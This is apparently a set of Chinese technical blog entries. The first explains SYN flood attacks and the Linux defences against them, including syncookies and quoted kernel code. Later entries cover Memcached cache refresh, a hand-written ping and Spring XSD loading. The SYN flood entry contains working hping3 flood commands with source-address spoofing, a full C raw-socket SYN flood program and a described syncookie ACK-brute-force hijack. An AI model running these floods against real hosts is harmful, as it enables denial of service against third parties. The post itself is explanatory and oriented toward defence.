    <content type="text"><![CDATA[update 2017-5-11: syncookies 会点用 tcp_options 字段空间，会强制关闭 tcp 高级流控技术而退化成原始 tcp 模式。此模式会导致 封包 丢失时对端要等待MSL时间来发现丢包事件并重试，以及关闭连接时 TIME_WAIT 状态保持 2MSL 时间。 简介TCP协议要经过三次握手才能建立连接(from wiki)： 于是出现了对于握手过程进行的攻击。攻击者发送大量的SYN包，服务器回应(SYN+ACK)包，但是攻击者不回应ACK包，这样的话，服务器不知道(SYN+ACK)是否发送成功，默认情况下会重试5次（tcp_syn_retries）。这样的话，对于服务器的内存，带宽都有很大的消耗。攻击者如果处于公网，可以伪造IP的话，对于服务器就很难根据IP来判断攻击者，给防护带来很大的困难。 攻与防攻击者角度从攻击者的角度来看，有两个地方可以提高服务器防御的难度的： 变换端口 伪造IP 变换端口很容易做到，攻击者可以使用任意端口。 攻击者如果是只有内网IP，是没办法伪造IP的，因为伪造的SYN包会被路由抛弃。攻击者如果是有公网IP，则有可能伪造IP，发出SYN包。（TODO，待更多验证） hping3hping3是一个很有名的网络安全工具，使用它可以很容易构造各种协议包。 用下面的命令可以很容易就发起SYN攻击： 123sudo hping3 --flood -S -p 9999 x.x.x.x#random source addresssudo hping3 --flood -S --rand-source -p 9999 x.x.x.x –flood 是不间断发包的意思 -S 是SYN包的意思 更多的选项，可以man hping3 查看文档，有详细的说明。 如果是条件允许，可以伪造IP地址的话，可以用–rand-source参数来伪造。我在实际测试的过程中，可以伪造IP，也可以发送出去，但是服务器没有回应，从本地路由器的统计数据可以看出是路由器把包给丢弃掉了。 我用两个美国的主机来测试，使用 1sudo hping3 --flood -S -p 9999 x.x.x.x 发现，实际上攻击效果有限，只有网络使用上涨了，服务器的cpu，内存使用都没有什么变化： 为什么会这样呢？下面再解析。 防御者角度当可能遇到SYN flood攻击时，syslog，/var/log/syslog里可能会出现下面的日志： 1kernel: [3649830.269068] TCP: Possible SYN flooding on port 9999. Sending cookies. Check SNMP counters. 这个也有可能是SNMP协议误报，下面再解析。 从防御者的角度来看，主要有以下的措施： 内核参数的调优 防火墙禁止掉部分IP linux内核参数调优主要有下面三个： 增大tcp_max_syn_backlog 减小tcp_synack_retries 启用tcp_syncookies tcp_max_syn_backlog从字面上就可以推断出是什么意思。在内核里有个队列用来存放还没有确认ACK的客户端请求，当等待的请求数大于tcp_max_syn_backlog时，后面的会被丢弃。 所以，适当增大这个值，可以在压力大的时候提高握手的成功率。手册里推荐大于1024。 tcp_synack_retries这个是三次握手中，服务器回应ACK给客户端里，重试的次数。默认是5。显然攻击者是不会完成整个三次握手的，因此服务器在发出的ACK包在没有回应的情况下，会重试发送。当发送者是伪造IP时，服务器的ACK回应自然是无效的。 为了防止服务器做这种无用功，可以把tcp_synack_retries设置为0或者1。因为对于正常的客户端，如果它接收不到服务器回应的ACK包，它会再次发送SYN包，客户端还是能正常连接的，只是可能在某些情况下建立连接的速度变慢了一点。 tcp_syncookies根据man tcp手册，tcp_syncookies是这样解析的： 12345678tcp_syncookies (Boolean; since Linux 2.2) Enable TCP syncookies. The kernel must be compiled with CONFIG_SYN_COOKIES. Send out syncookies when the syn backlog queue of a socket overflows. The syncookies feature attempts to protect a socket from a SYN flood attack. This should be used as a last resort, if at all. This is a violation of the TCP protocol, and conflicts with other areas of TCP such as TCP extensions. It can cause problems for clients and relays. It is not recommended as a tuning mechanism for heavily loaded servers to help with overloaded or misconfig‐ ured conditions. For recommended alternatives see tcp_max_syn_backlog, tcp_synack_retries, and tcp_abort_on_overflow. 当半连接的请求数量超过了tcp_max_syn_backlog时，内核就会启用SYN cookie机制，不再把半连接请求放到队列里，而是用SYN cookie来检验。 手册上只给出了模糊的说明，具体的实现没有提到。 linux下SYN cookie的实现查看了linux的代码（https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c ）后，发现linux的实现并不是像wiki上 SYN cookie是非常巧妙地利用了TCP规范来绕过了TCP连接建立过程的验证过程，从而让服务器的负载可以大大降低。 在三次握手中，当服务器回应（SYN + ACK）包后，客户端要回应一个n + 1的ACK到服务器。其中n是服务器自己指定的。当启用tcp_syncookies时，linux内核生成一个特定的n值，而不并把客户的连接放到半连接的队列里（即没有存储任何关于这个连接的信息）。当客户端提交第三次握手的ACK包时，linux内核取出n值，进行校验，如果通过，则认为这个是一个合法的连接。 n即ISN（initial sequence number），是一个无符号的32位整数，那么linux内核是如何把信息记录到这有限的32位里，并完成校验的？ 首先，TCP连接建立时，双方要协商好MSS（Maximum segment size），服务器要把客户端在ACK包里发过来的MSS值记录下来。 另外，因为服务器没有记录ACK包的任何信息，实际上是绕过了正常的TCP握手的过程，服务器只能靠客户端的第三次握手发过来的ACK包来验证，所以必须要有一个可靠的校验算法，防止攻击者伪造ACK，劫持会话。 linux是这样实现的： 在服务器上有一个60秒的计时器，即每隔60秒，count加一； MSS是这样子保存起来的，用一个硬编码的数组，保存起一些MSS值： 123456static __u16 const msstab[] = &#123; 536, 1300, 1440, /* 1440, 1452: PPPoE */ 1460,&#125;; 比较客户发过来的mms，取一个比客户发过来的值还要小的mms。算法很简单： 12345678910111213141516171819/* * Generate a syncookie. mssp points to the mss, which is returned * rounded down to the value encoded in the cookie. */u32 __cookie_v4_init_sequence(const struct iphdr *iph, const struct tcphdr *th, u16 *mssp)&#123; int mssind; const __u16 mss = *mssp; for (mssind = ARRAY_SIZE(msstab) - 1; mssind ; mssind--) if (mss &gt;= msstab[mssind]) break; *mssp = msstab[mssind]; return secure_tcp_syn_cookie(iph-&gt;saddr, iph-&gt;daddr, th-&gt;source, th-&gt;dest, ntohl(th-&gt;seq), mssind);&#125; 比较客户发过来的mms，取一个比客户发过来的值还要小的mms。 真正的算法在这个函数里： 12345678910111213141516171819static __u32 secure_tcp_syn_cookie(__be32 saddr, __be32 daddr, __be16 sport, __be16 dport, __u32 sseq, __u32 data)&#123; /* * Compute the secure sequence number. * The output should be: * HASH(sec1,saddr,sport,daddr,dport,sec1) + sseq + (count * 2^24) * + (HASH(sec2,saddr,sport,daddr,dport,count,sec2) % 2^24). * Where sseq is their sequence number and count increases every * minute by 1. * As an extra hack, we add a small "data" value that encodes the * MSS into the second hash value. */ u32 count = tcp_cookie_time(); return (cookie_hash(saddr, daddr, sport, dport, 0, 0) + sseq + (count &lt;&lt; COOKIEBITS) + ((cookie_hash(saddr, daddr, sport, dport, count, 1) + data) &amp; COOKIEMASK));&#125; data实际上是mss的值对应的数组下标，count是每一分钟会加1，sseq是客户端发过来的sequence。 这样经过hash和一些加法，得到了一个ISN值，其中里记录了这个连接合适的MSS值。 当接收到客户端发过来的第三次握手的ACK包时，反向检查即可： 1234567891011121314/* * Check if a ack sequence number is a valid syncookie. * Return the decoded mss if it is, or 0 if not. */int __cookie_v4_check(const struct iphdr *iph, const struct tcphdr *th, u32 cookie)&#123; __u32 seq = ntohl(th-&gt;seq) - 1; __u32 mssind = check_tcp_syn_cookie(cookie, iph-&gt;saddr, iph-&gt;daddr, th-&gt;source, th-&gt;dest, seq); return mssind &lt; ARRAY_SIZE(msstab) ? msstab[mssind] : 0;&#125; 先得到原来的seq，再调用check_tcp_syn_cookie函数： 1234567891011121314151617181920212223242526272829/* * This retrieves the small "data" value from the syncookie. * If the syncookie is bad, the data returned will be out of * range. This must be checked by the caller. * * The count value used to generate the cookie must be less than * MAX_SYNCOOKIE_AGE minutes in the past. * The return value (__u32)-1 if this test fails. */static __u32 check_tcp_syn_cookie(__u32 cookie, __be32 saddr, __be32 daddr, __be16 sport, __be16 dport, __u32 sseq)&#123; u32 diff, count = tcp_cookie_time(); /* Strip away the layers from the cookie */ cookie -= cookie_hash(saddr, daddr, sport, dport, 0, 0) + sseq; /* Cookie is now reduced to (count * 2^24) ^ (hash % 2^24) */ diff = (count - (cookie &gt;&gt; COOKIEBITS)) &amp; ((__u32) -1 &gt;&gt; COOKIEBITS); if (diff &gt;= MAX_SYNCOOKIE_AGE) return (__u32)-1; return (cookie - cookie_hash(saddr, daddr, sport, dport, count - diff, 1)) &amp; COOKIEMASK; /* Leaving the data behind */&#125; 先减去之前的一些值，第一个hash和sseq。然后计算现在的count（每60秒加1的计数器）和之前的发给客户端，然后客户端返回过来的count的差：如果大于MAX_SYNCOOKIE_AGE，即2，即2分钟。则说明已经超时了。 否则，计算得出之前放进去的mss。这样内核就认为这个是一个合法的TCP连接，并且得到了一个合适的mss值，这样就建立起了一个合法的TCP连接。可以看到SYN cookie机制十分巧妙地不用任何存储，以略消耗CPU实现了对第三次握手的校验。 但是有得必有失，ISN里只存储了MSS值，因此，其它的TCP Option都不会生效，这就是为什么SNMP协议会误报的原因了。 更强大的攻击者SYN cookie虽然十分巧妙，但是也给攻击者带了新的攻击思路。 因为SYN cookie机制不是正常的TCP三次握手。因此攻击者可以构造一个第三次握手的ACK包，从而劫持会话。 攻击者的思路很简单，通过暴力发送大量的伪造的第三次握手的ACK包，因为ISN只有32位，攻击者只要发送全部的ISN数据ACK包，总会有一个可以通过服务器端的校验。 有的人就会问了，即使攻击者成功通过了服务器的检验，它还是没有办法和服务器正常通讯啊，因为服务器回应的包都不会发给攻击者。 刚开始时，我也有这个疑问，但是TCP允许在第三次握手的ACK包里带上后面请求的数据，这样可以加快数据的传输。所以，比如一个http服务器，攻击者可以通过在第三次握手的ACK包里带上http get/post请求，从而完成攻击。 所以对于服务器而言，不能只是依靠IP来校验合法的请求，还要通过其它的一些方法来加强校验。比如CSRF等。 值得提醒的是即使是正常的TCP三次握手过程，攻击者还是可以进行会话劫持的，只是概率比SYN cookie的情况下要小很多。 详细的攻击说明：http://www.91ri.org/7075.html 一个用raw socket SYN flood攻击的代码下面给出一个tcp syn flood的攻击的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdlib.h&gt;#include &lt;errno.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt; #pragma pack(1)struct pseudo_header //needed for checksum calculation&#123; unsigned int source_address; unsigned int dest_address; unsigned char placeholder; unsigned char protocol; unsigned short tcp_length; struct tcphdr tcp;&#125;;#pragma pack() unsigned short csum(unsigned short *ptr, int nbytes) &#123; long sum; unsigned short oddbyte; short answer; sum = 0; while (nbytes &gt; 1) &#123; sum += *ptr++; nbytes -= 2; &#125; if (nbytes == 1) &#123; oddbyte = 0; *((u_char*) &amp;oddbyte) = *(u_char*) ptr; sum += oddbyte; &#125; sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); sum = sum + (sum &gt;&gt; 16); answer = (short) ~sum; return (answer);&#125; void oneSyn(int socketfd, in_addr_t source, u_int16_t sourcePort, in_addr_t destination, u_int16_t destinationPort) &#123; static char sendBuf[sizeof(iphdr) + sizeof(tcphdr)] = &#123; 0 &#125;; bzero(sendBuf, sizeof(sendBuf)); struct iphdr* ipHeader = (iphdr*) sendBuf; struct tcphdr *tcph = (tcphdr*) (sendBuf + sizeof(iphdr)); ipHeader-&gt;version = 4; ipHeader-&gt;ihl = 5; ipHeader-&gt;tos = 0; ipHeader-&gt;tot_len = htons(sizeof(sendBuf)); ipHeader-&gt;id = htons(1); ipHeader-&gt;frag_off = 0; ipHeader-&gt;ttl = 254; ipHeader-&gt;protocol = IPPROTO_TCP; ipHeader-&gt;check = 0; ipHeader-&gt;saddr = source; ipHeader-&gt;daddr = destination; ipHeader-&gt;check = csum((unsigned short*) ipHeader, ipHeader-&gt;ihl * 2); //TCP Header tcph-&gt;source = htons(sourcePort); tcph-&gt;dest = htons(destinationPort); tcph-&gt;seq = 0; tcph-&gt;ack_seq = 0; tcph-&gt;doff = 5; //sizeof(tcphdr)/4 tcph-&gt;fin = 0; tcph-&gt;syn = 1; tcph-&gt;rst = 0; tcph-&gt;psh = 0; tcph-&gt;ack = 0; tcph-&gt;urg = 0; tcph-&gt;window = htons(512); tcph-&gt;check = 0; tcph-&gt;urg_ptr = 0; //tcp header checksum struct pseudo_header pseudoHeader; pseudoHeader.source_address = source; pseudoHeader.dest_address = destination; pseudoHeader.placeholder = 0; pseudoHeader.protocol = IPPROTO_TCP; pseudoHeader.tcp_length = htons(sizeof(tcphdr)); memcpy(&amp;pseudoHeader.tcp, tcph, sizeof(struct tcphdr)); tcph-&gt;check = csum((unsigned short*) &amp;pseudoHeader, sizeof(pseudo_header)); struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(sourcePort); sin.sin_addr.s_addr = destination; ssize_t sentLen = sendto(socketfd, sendBuf, sizeof(sendBuf), 0, (struct sockaddr *) &amp;sin, sizeof(sin)); if (sentLen == -1) &#123; perror("sent error"); &#125;&#125; int main(void) &#123; //for setsockopt int optval = 1; //create a raw socket int socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); if (socketfd == -1) &#123; perror("create socket:"); exit(0); &#125; if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &amp;optval, sizeof(optval)) &lt; 0) &#123; perror("create socket:"); exit(0); &#125; in_addr_t source = inet_addr("192.168.1.100"); in_addr_t destination = inet_addr("192.168.1.101"); u_int16_t sourcePort = 1; u_int16_t destinationPort = 9999; while (1) &#123; oneSyn(socketfd, source, sourcePort++, destination, destinationPort); sourcePort %= 65535; sleep(1); &#125; return 0;&#125; 总结对于SYN flood攻击，调整下面三个参数就可以防范绝大部分的攻击了。 增大tcp_max_syn_backlog 减小tcp_synack_retries 启用tcp_syncookies 貌似现在的内核默认都是开启tcp_syncookies的。 参考 http://www.redhat.com/archives/rhl-devel-list/2005-January/msg00447.html man tcp http://nixcraft.com/showthread.php/16864-Linux-Howto-test-and-stop-syn-flood-attacks http://en.wikipedia.org/wiki/SYN_cookies https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c http://www.91ri.org/7075.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>tcp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应对Memcached缓存失效，导致高并发查询DB的几种思路]]></title>
    <url>%2Fmemcached-cache-db%2F</url>
    <content type="text"><![CDATA[update最近看到nginx的合并回源，这个和下面的思路有点像。不过nginx的思路还是在控制缓存失效时的并发请求，而不是当缓存快要失效时，及时地更新缓存。 nginx合并回源，参考：http://blog.csdn.net/brainkick/article/details/8570698 update: 2015-04-23 前言当Memcached缓存失效时，容易出现高并发的查询DB，导致DB压力骤然上升。 这篇blog主要是探讨如何在缓存将要失效时，及时地更新缓存，而不是如何在缓存失效之后，如何防止高并发的DB查询。 个人认为，当缓存将要失效时，及时地把新的数据刷到memcached里，这个是解决缓存失效瞬间高并发查DB的最好方法。那么如何及时地知道缓存将要失效？ 解决这个问题有几种思路： 比如一个key是aaa，失效时间是30s。 定期从DB里查询数据，再刷到memcached里这种方法有个缺点是，有些业务的key可能是变化的，不确定的。 而且不好界定哪些数据是应该查询出来放到缓存中的，难以区分冷热数据。 当缓存取到为null时，加锁去查询DB，只允许一个线程去查询DB这种方式不太靠谱，不多讨论。而且如果是多个web服务器的话，还是有可能有并发的操作。 在向memcached写入value时，同时写入当前机器在时间作为过期时间当get得到数据时，如果当前时间 - 过期时间 &gt; 5s，则后台启动一个任务去查询DB，更新缓存。 当然，这里的后台任务必须保证同一个key，只有一个线程在执行查询DB的任务，不然这个还是高并发查询DB。 缺点是要把过期时间和value合在一起序列化，取出数据后，还要反序列化。很不方便。 网上大部分文章提到的都是前面两种方式，有少数文章提到第3种方式。下面提出一种基于两个key的方法： 两个key，一个key用来存放数据，另一个用来标记失效时间比如key是aaa，设置失效时间为30s，则另一个key为expire_aaa，失效时间为25s。 在取数据时，用multiget，同时取出aaa和expire_aaa，如果expire_aaa的value == null，则后台启动一个任务去查询DB，更新缓存。和上面类似。 对于后台启动一个任务去查询DB，更新缓存，要保证一个key只有一个线程在执行，这个如何实现？ 对于同一个进程，简单加锁即可。拿到锁的就去更新DB，没拿到锁的直接返回。 对于集群式的部署的，如何实现只允许一个任务执行？ 这里就要用到memcached的add命令了。 add命令是如果不存在key，则设置成功，返回true，如果已存在key，则不存储，返回false。 当get expired_aaa是null时，则add expired_aaa 过期时间由自己灵活处理。比如设置为3秒。 如果成功了，再去查询DB，查到数据后，再set expired_aaa为25秒。set aaa 为30秒。 综上所述，来梳理下流程： 比如一个key是aaa，失效时间是30s。查询DB在1s内。 put数据时，设置aaa过期时间30s，设置expire_aaa过期时间25s； get数据时，multiget aaa 和 expire_aaa，如果expired_aaa对应的value != null，则直接返回aaa对应的数据给用户。如果expire_aaa返回value == null，则后台启动一个任务，尝试add expire_aaa，并设置超时过间为3s。这里设置为3s是为了防止后台任务失败或者阻塞，如果这个任务执行失败，那么3秒后，如果有另外的用户访问，那么可以再次尝试查询DB。如果add执行成功，则查询DB，再更新aaa的缓存，并设置expire_aaa的超时时间为25s。 时间存到Value里，再结合add命令来保证只有一个线程去刷新数据update:2014-06-29 最近重新思考了下这个问题。发现第4种两个key的办法比较耗memcached的内存，因为key数翻倍了。结合第3种方式，重新设计了下，思路如下： 仍然使用两个key的方案：key 和 __load_{key} 其中，__load_{key} 这个key相当于一个锁，只允许add成功的线程去更新数据，而这个key的超时时间是比较短的，不会一直占用memcached的内存。 在set 到Memcached的value中，加上一个时间，(time, value)，time是memcached上的key未来会过期的时间，并不是当前系统时间。 当get到数据时，检查时间是否快要超时： time - now &lt; 5 * 1000，假定设置了快要超时的时间是5秒。 如果是，则后台启动一个新的线程： 尝试 add __load_{key}， 如果成功，则去加载新的数据，并set到memcached中。 原来的线程直接返回value给调用者。 按上面的思路，用xmemcached封装了下： DataLoader，用户要实现的加载数据的回调接口： 123public interface DataLoader &#123; public &lt;T&gt; T load();&#125; RefreshCacheManager，用户只需要关心这这两个接口函数： 1234public class RefreshCacheManager &#123; static public &lt;T&gt; T tryGet(MemcachedClient memcachedClient, final String key, final int expire, final DataLoader dataLoader); static public &lt;T&gt; T autoRetryGet(MemcachedClient memcachedClient, final String key, final int expire, final DataLoader dataLoader);&#125; 其中autoRetryGet函数如果get到是null，内部会自动重试4次，每次间隔500ms。 RefreshCacheManager内部自动处理数据快过期，重新刷新到memcached的逻辑。 详细的封装代码在这里：https://gist.github.com/hengyunabc/cc57478bfcb4cd0553c2 总结我个人是倾向于第5种方式的，因为很简单，直观。比第4种方式要节省内存，而且不用mget，在使用memcached集群时不用担心出麻烦事。 这种两个key的方式，还有一个好处，就是数据是自然冷热适应的。如果是冷数据，30秒都没有人访问，那么数据会过期。 如果是热门数据，一直有大流量访问，那么数据就是一直热的，而且数据一直不会过期。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>memcached</tag>
        <tag>cache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯谈网络编程之自己实现ping]]></title>
    <url>%2Fabout-ping%2F</url>
    <content type="text"><![CDATA[前言ping是基于ICMP（Internet Control Message Protocol）协议实现的，而ICMP协议是在IP层实现的。 ping实际上是发起者发送一个Echo Request(type = 8)的，远程主机回应一个Echo Reply(type = 0)的过程。 为什么用ping不能测试某一个端口刚开始接触网络的时候，可能很多人都有疑问，怎么用ping来测试远程主机的某个特定端口？ 其实如果看下ICMP协议，就可以发现ICMP里根本没有端口这个概念，也就根本无法实现测试某一个端口了。 ICMP协议的包格式可以直接参考wiki： https://en.wikipedia.org/wiki/Ping_(networking_utility)#ICMP_packet Ping如何计算请问耗时在ping命令的输出上，可以看到有显示请求的耗时，那么这个耗时是怎么得到的呢？ 164 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=6.28 ms 从Echo Request的格式里，看到不时间相关的东东，但是因为是Echo，即远程主机会原样返回Data数据，所以Ping的发起方把时间放到了Data数据里，当得到Echo Reply里，取到发送时间，再和当前时间比较，就可以得到耗时了。当然，还有其它的思路，比如记录每一个包的发送时间，当得到返回时，再计算得到时间差，但显然这样的实现太复杂了。 Ping如何区分不同的进程？我们都知道本机IP，远程IP，本机端口，远程端口，四个元素才可以确定唯的一个信道。而ICMP里没有端口，那么一个ping程序如何知道哪些包才是发给自己的？或者说操作系统如何区别哪个Echo Reply是要发给哪个进程的？ 实际上操作系统不能区别，所有的本机IP，远程IP相同的ICMP程序都可以接收到同一份数据。 程序自己要根据Identifier来区分到底一个ICMP包是不是发给自己的。在Linux下，Ping发出去的Echo Request包里Identifier就是进程pid，远程主机会返回一个Identifier相同的Echo Reply包。 可以接下面的方法简单验证： 启动系统自带的ping程序，查看其pid。 设定自己实现的ping程序的identifier为上面得到的pid，然后发Echo Request包。 可以发现系统ping程序会接收到远程主机的回应。 自己实现ping自己实现ping要用到rawsocket，在linux下需要root权限。网上有很多实现的程序，但是有很多地方不太对的。自己总结实现了一个（最好用g++编绎）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;stdlib.h&gt;#include &lt;errno.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/time.h&gt; unsigned short csum(unsigned short *ptr, int nbytes) &#123; register long sum; unsigned short oddbyte; register short answer; sum = 0; while (nbytes &gt; 1) &#123; sum += *ptr++; nbytes -= 2; &#125; if (nbytes == 1) &#123; oddbyte = 0; *((u_char*) &amp;oddbyte) = *(u_char*) ptr; sum += oddbyte; &#125; sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); sum = sum + (sum &gt;&gt; 16); answer = (short) ~sum; return (answer);&#125; inline double countMs(timeval before, timeval after)&#123; return (after.tv_sec - before.tv_sec)*1000 + (after.tv_usec - before.tv_usec)/1000.0;&#125; #pragma pack(1)struct EchoPacket &#123; u_int8_t type; u_int8_t code; u_int16_t checksum; u_int16_t identifier; u_int16_t sequence; timeval timestamp; char data[40]; //sizeof(EchoPacket) == 64&#125;;#pragma pack() void ping(in_addr_t source, in_addr_t destination) &#123; static int sequence = 1; static int pid = getpid(); static int ipId = 0; char sendBuf[sizeof(iphdr) + sizeof(EchoPacket)] = &#123; 0 &#125;; struct iphdr* ipHeader = (iphdr*)sendBuf; ipHeader-&gt;version = 4; ipHeader-&gt;ihl = 5; ipHeader-&gt;tos = 0; ipHeader-&gt;tot_len = htons(sizeof(sendBuf)); ipHeader-&gt;id = htons(ipId++); ipHeader-&gt;frag_off = htons(0x4000); //set Flags: don't fragment ipHeader-&gt;ttl = 64; ipHeader-&gt;protocol = IPPROTO_ICMP; ipHeader-&gt;check = 0; ipHeader-&gt;saddr = source; ipHeader-&gt;daddr = destination; ipHeader-&gt;check = csum((unsigned short*)ipHeader, ipHeader-&gt;ihl * 2); EchoPacket* echoRequest = (EchoPacket*)(sendBuf + sizeof(iphdr)); echoRequest-&gt;type = 8; echoRequest-&gt;code = 0; echoRequest-&gt;checksum = 0; echoRequest-&gt;identifier = htons(pid); echoRequest-&gt;sequence = htons(sequence++); gettimeofday(&amp;(echoRequest-&gt;timestamp), NULL); u_int16_t ccsum = csum((unsigned short*)echoRequest, sizeof(sendBuf) - sizeof(iphdr)); echoRequest-&gt;checksum = ccsum; struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(0); sin.sin_addr.s_addr = destination; int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); if (s == -1) &#123; perror("socket"); return; &#125; //IP_HDRINCL to tell the kernel that headers are included in the packet if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, "1",sizeof("1")) &lt; 0) &#123; perror("Error setting IP_HDRINCL"); exit(0); &#125; sendto(s, sendBuf, sizeof(sendBuf), 0, (struct sockaddr *) &amp;sin, sizeof(sin)); char responseBuf[sizeof(iphdr) + sizeof(EchoPacket)] = &#123;0&#125;; struct sockaddr_in receiveAddress; socklen_t len = sizeof(receiveAddress); int reveiveSize = recvfrom(s, (void*)responseBuf, sizeof(responseBuf), 0, (struct sockaddr *) &amp;receiveAddress, &amp;len); if(reveiveSize == sizeof(responseBuf))&#123; EchoPacket* echoResponse = (EchoPacket*) (responseBuf + sizeof(iphdr)); //TODO check identifier == pid ? if(echoResponse-&gt;type == 0)&#123; struct timeval tv; gettimeofday(&amp;tv, NULL); in_addr tempAddr; tempAddr.s_addr = destination; printf("%d bytes from %s : icmp_seq=%d ttl=%d time=%.2f ms\n", sizeof(EchoPacket), inet_ntoa(tempAddr), ntohs(echoResponse-&gt;sequence), ((iphdr*)responseBuf)-&gt;ttl, countMs(echoResponse-&gt;timestamp, tv)); &#125;else&#123; printf("response error, type:%d\n", echoResponse-&gt;type); &#125; &#125;else&#123; printf("error, response size != request size.\n"); &#125; close(s);&#125; int main(void) &#123; in_addr_t source = inet_addr("192.168.1.100"); in_addr_t destination = inet_addr("192.168.1.1"); for(;;)&#123; ping(source, destination); sleep(1); &#125; return 0;&#125; 安全相关的一些东东 死亡之Ping http://zh.wikipedia.org/wiki/%E6%AD%BB%E4%BA%A1%E4%B9%8BPing 尽管是很老的漏洞，但是也可以看出协议栈的实现也不是那么的靠谱。 Ping flood http://en.wikipedia.org/wiki/Ping_flood 服务器关闭ping服务，默认是0,是开启： 1echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all 总结在自己实现的过程中，发现有一些蛋疼的地方，如 协议文档不够清晰，得反复对照； 有时候一个小地方处理不对，很难查bug，即使程序能正常工作，但也并不代表它是正确的； 用wireshark可以很方便验证自己写的程序有没有问题。 参考 http://en.wikipedia.org/wiki/Ping_(networking_utility) http://en.wikipedia.org/wiki/ICMP_Destination_Unreachable http://tools.ietf.org/pdf/rfc792.pdf]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>ping</tag>
        <tag>network</tag>
        <tag>udp</tag>
        <tag>ICMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么在Spring的配置里，最好不要配置xsd文件的版本号]]></title>
    <url>%2Fspring-xsd%2F</url>
    <content type="text"><![CDATA[为什么dubbo启动没有问题？这篇blog源于一个疑问： 我们公司使了阿里的dubbo，但是阿里的开源网站http://code.alibabatech.com，挂掉有好几个月了，为什么我们的应用启动没有问题？ 我们的应用的Spring配置文件里有类似的配置： 1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dubbo="http://code.alibabatech.com/schema/dubbo" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd"&gt; 我们都知道Spring在启动时是要检验XML文件的。或者为什么在Eclipse里xml没有错误提示？比如这样的一个Spring配置： 12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;&lt;/beans&gt; 我们也可以在后面加上版本号： 1xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"&gt; 有这个版本号和没有有什么区别呢？ XML的一些概念首先来看下xml的一些概念： xml的schema里有namespace，可以给它起个别名。比如常见的spring的namespace： 12xmlns:mvc="http://www.springframework.org/schema/mvc"xmlns:context="http://www.springframework.org/schema/context" 通常情况下，namespace对应的URI是一个存放XSD的地址，尽管规范没有这么要求。如果没有提供schemaLocation，那么Spring的XML解析器会从namespace的URI里加载XSD文件。我们可以把配置文件改成这个样子，也是可以正常工作的： 123&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans/spring-beans.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt; schemaLocation提供了一个xml namespace到对应的XSD文件的一个映射，所以我们可以看到，在xsi:schemaLocation后面配置的字符串都是成对的，前面的是namespace的URI，后面是xsd文件的URI。比如： 1234xsi:schemaLocation="http://www.springframework.org/schema/beanshttp://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/securityhttp://www.springframework.org/schema/security/spring-security.xsd" Spring是如何校验XML的Spring默认在启动时是要加载XSD文件来验证xml文件的，所以如果有的时候断网了，或者一些开源软件切换域名，那么就很容易碰到应用启动不了。我记得当时Oracle收购Sun公司时，遇到过这个情况。 为了防止这种情况，Spring提供了一种机制，默认从本地加载XSD文件。打开spring-context-3.2.0.RELEASE.jar，可以看到里面有两个特别的文件： spring.handlers 12345http\://www.springframework.org/schema/context=org.springframework.context.config.ContextNamespaceHandlerhttp\://www.springframework.org/schema/jee=org.springframework.ejb.config.JeeNamespaceHandlerhttp\://www.springframework.org/schema/lang=org.springframework.scripting.config.LangNamespaceHandlerhttp\://www.springframework.org/schema/task=org.springframework.scheduling.config.TaskNamespaceHandlerhttp\://www.springframework.org/schema/cache=org.springframework.cache.config.CacheNamespaceHandler spring.schemas 